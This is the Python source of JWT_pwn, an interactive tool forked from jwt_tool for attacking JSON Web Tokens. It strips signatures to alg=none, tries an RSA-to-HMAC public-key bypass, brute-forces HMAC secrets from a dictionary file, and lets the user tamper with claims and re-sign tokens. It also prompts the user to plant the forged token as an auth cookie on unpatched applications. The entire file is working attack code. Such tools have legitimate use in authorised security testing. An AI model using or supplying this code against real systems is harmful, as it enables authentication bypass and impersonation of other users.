#! /usr/bin/python3

# JWT_pwn version 1.1(7_12_2019)
# Forked from https://github.com/ticarpi/jwt_tool
# Written by Sparrrgh & Franco Marino

import sys
import hashlib
import hmac
import base64
import json
from collections import OrderedDict
from JWT import JWT

if __name__ == '__main__':
	
	print("     .-..-.   .-..-----.                              ")
	print("     : :: :.-.: :`-. .-'                              ")
	print("   _ : :: :: :: :  : :         .---. .-..-..-.,-.,-.  ")
	print("  : :; :: `' `' ;  : :         : .; `: `; `; :: ,. :  ")
	print("  `.__.' `.,`.,'   :_;   _____ : ._.'`.__.__.':_;:_;  ")
	print("                        :_____:: :                    ")
	print("                               :_;      JWT_pwn v1.1  ")
	# Only use Python3
	if sys.version_info[0] < 3:
		print("[!] Must be using Python 3")
		exit(1)

# Print usage + check token validity
	if len(sys.argv) < 2:
		jwt_provided = input("Please provide a token to test: ")
		if jwt_provided == "":
			print("Usage: $ python3 JWT_pwn.py <token>")
			exit(1)
	else:
		jwt_provided = sys.argv[1]
		
# Create token object
	try:
		JWT_token = JWT(jwt_provided)
	except:
		print("[!] Invalid token")
		exit(1)

# Main menu
	print("\nToken header values:")
	for i in JWT_token.headDict:
  		print(f"[+] {i} = {JWT_token.headDict[i]}")
	print("\nToken payload values:")
	for i in JWT_token.paylDict:
  		print(f"[+] {i} = {JWT_token.paylDict[i]}")

	#Options printed according to alg
	print("\nOptions:")
	menuArr = ["strip"]
	print("1: Strip signature (alg=none)")
	if(JWT_token.headDict["alg"][:2] == "HS"):
		menuArr.append("check_HS")
		print("2: Check signature against a key (symmetric)")
		menuArr.append("check_HS_file")
		print("3: Check signature against a key file (\"kid\") (symmetric)")
		menuArr.append("crack_HS")
		print("4: Crack signature with supplied dictionary file (symmetric)")
	elif(JWT_token.headDict["alg"][:2] == "RS"):
		menuArr.append("bypass_RSA")
		print("2: Check for Public Key bypass in RSA mode")
	menuArr.append("tamper_token")
	print(f"{len(menuArr)}: Tamper token")

	print(f"\nPlease make a selection (1-{len(menuArr)})")

	try:
		selection = int(input("> "))
		if(selection <= 0):
			raise RuntimeError("Option not valid")
		selection = menuArr[selection-1]
		
	except:
		selection = "else"
	
	#Strip signature
	if selection == "strip":
		JWT_token.strip_signature()
		print("\n[+] Stripped token generated")	
		print(f"\n{JWT_token}\n")
		exit(1)
	#Bypass RSA mode
	elif selection == "bypass_RSA":
		print("\nPlease enter the Public Key filename:")
		pubKey = input("> ")
		try:
			JWT_token.check_rsa_bypass(pubKey)
			print("\n[+] Token generated")
			print(JWT_token)
		except FileNotFoundError:
			print(f"[!] File {pubKey} doesn't exist")
		except RuntimeError: 
			print("[!] The signature is already symmetrical")
	#Check signature against a key
	elif selection == "check_HS":
		print("Type in the key to test")
		key = input("> ")
		try:
			if(JWT_token.check_key_HS(key)):
				if len(key) > 25:
					print(f"[+] {key[:25]} ...(output trimmed) is the CORRECT key!")
				else:
					print(f"[+] {key} is the CORRECT key!")
			else:
				if len(key) > 25:
						print(f"[-] {key[:25]} ...(output trimmed) is not the correct key")
				else:
					print(f"[-] {key} is not the correct key")
		except RuntimeError:
			print("[!] Algorithm is not HMAC-SHA")
	#Check signature against a keyfile
	elif selection == "check_HS_file":
		print("\nPlease enter the key filename:")
		file_name= input(">")
		try:
			with open(file_name) as file:
				print(f"[+] File loaded: {file_name}")
				#Strip \n because usually HS256 are generated by the app, and not taken from files
				key = file.read().strip('\n')
				if(JWT_token.check_key_HS(key)):	
					if len(key) > 25:
						print(f"[+] {key[:25]} ...(output trimmed) is the CORRECT key!")
					else:
						print(f"[+] {key} is the CORRECT key!")
				else:
					if len(key) > 25:
							print(f"[-] {key[:25]} ...(output trimmed) is not the correct key")
					else:
						print(f"[-] {key} is not the correct key")
		except RuntimeError:
					print("[!] Algorithm is not HMAC-SHA")
		except FileNotFoundError:
			print(f"[!] File {file_name} doesn't exist")
	#Crack the HS key
	elif selection == "crack_HS":
		print("\nPlease enter the dictionary filename:")
		file_name= input("> ")
		try:
			with open(file_name) as f:
				print(f"File loaded: {file_name}")
				num_lines = sum(1 for line in open(file_name) if line.rstrip())
				with open(file_name, "r") as f:
					found = False
					print(f"Testing {num_lines} passwords")
					for i in f.readlines():
						i = i.strip("\n")
						if(JWT_token.check_key_HS(i)):
							found = True
							print(f"[+] {i} is the CORRECT key!")
					if(not found):
						print("[-] The key was not found")
		except FileNotFoundError:
			print(f"[!] File {file_name} doesn't exist")
		except RuntimeError:
			print("[!] Algorithm is not HMAC-SHA")
	#Tamper token
	elif selection == "tamper_token":
		isHeader = True
		#tamper header and payload
		for field_dict in [JWT_token.headDict, JWT_token.paylDict]:
			if(isHeader):
				print("\nToken header values:")
			else:
				print("\nToken payload values:")
			tampering = True
			while tampering:
				i = 0
				keys = list(field_dict)
				for pair in field_dict:
					print(f"[{i}] {pair} = {field_dict[pair]}")
					i += 1
				print(f"[{i}] *Add a new value*")
				selection = 0
				print("\nPlease select a field number:\n(or ENTER to Continue)")
				try:
					selection = input("> ")
					#If enter -1 to skip
					if(selection == ""):
						selection = -1
					else:
						selection = int(selection)
				except:
					selection = -2
				if(selection<len(field_dict) and selection>=0):
					selectedKey = keys[selection]
					print(f"\nCurrent value of {selectedKey} is: {field_dict[selectedKey]}")
					print("Please enter new value and hit ENTER")
					newVal = input("> ")
					JWT_token.edit_token(selectedKey,newVal,isHeader)
				elif (selection == i):
					print("Please enter new Key and hit ENTER")
					newPair = input("> ")
					print(f"Please enter a new value for {newPair} and hit ENTER")
					newVal = input("> ")
					JWT_token.edit_token(newPair,newVal,isHeader)
				elif (selection == -1):
					tampering = False
					#Editing payload next
					isHeader = False
				else:
					print("[!] Option not valid \n")
					exit(1)
		
		#signature
		print("\nToken Signing:")
		print("1: Strip signature (alg=none)")
		print("2: Check for Public Key bypass in RSA mode")
		print("3: Sign with known key (symmetric)")
		print("4: Sign with key file (\"kid\") (symmetric)")
		print("\nPlease select an option from above (1-4):")
		try:
			selection = int(input("> "))
		except:
			selection = 0
		#Strip signature
		if selection == 1:
			JWT_token.strip_signature()
			print("\n[+] Stripped token generated")
			print(f"\n{JWT_token}\n")
			exit(1)
		#Bypass RSA mode
		elif selection == 2:
			print("\nPlease enter the Public Key filename:")
			pubKey = input("> ")
			try:
				JWT_token.check_rsa_bypass(pubKey)
				print("\nSet this new token as the AUTH cookie, or session/local storage data (as appropriate for the web application).\n(This will only be valid on unpatched implementations of JWT.)")
				print(JWT_token)
			except FileNotFoundError:
				print(f"[!] File {pubKey} doesn't exist")
			except RuntimeError:
				print("[!] The signature is already symmetrical")
		#Check signature against a key
		elif selection == 3:
			print("\nPlease enter the keylength:")
			print("[1] HMAC-SHA256")
			print("[2] HMAC-SHA384")
			print("[3] HMAC-SHA512")
			try:
				selLength = int(input("> "))
			except:
				print("[!] Option not valid")
				exit(1)
			if selLength == 2:
				keyLen = 384
			elif selLength == 3:
				keyLen = 512
			else:
				keyLen = 256
			print("Type in the key to test")
			key = input("> ")
			JWT_token.sign_token_HS_urlsafe(key,keyLen)
			print(JWT_token)
			exit(1)
		#Check against keyfile
		elif selection == 4:
			print("\nPlease enter the keylength:")
			print("[1] HMAC-SHA256")
			print("[2] HMAC-SHA384")
			print("[3] HMAC-SHA512")
			try:
				selLength = int(input("> "))
			except:
				print("[!] Option not valid")
				exit(1)
			if selLength == 2:
				keyLen = 384
			elif selLength == 3:
				keyLen = 512
			else:
				keyLen = 256
			
			print("\nPlease enter the key filename:")
			file_name= input(">")
			try:
				with open(file_name) as file:
					print(f"File loaded: {file_name}")
					#Strip \n because usually HS256 are generated by the app, and not taken from files
					key = file.read().strip('\n')
					JWT_token.sign_token_HS_urlsafe(key,keyLen)
					print(JWT_token)
			except FileNotFoundError:
				print(f"[!] File {file_name} doesn't exist")
			exit(1)
		else:
			print("[!] Option not valid")
			exit(1)
	else:
		print("[!] Option not valid")
	exit(1)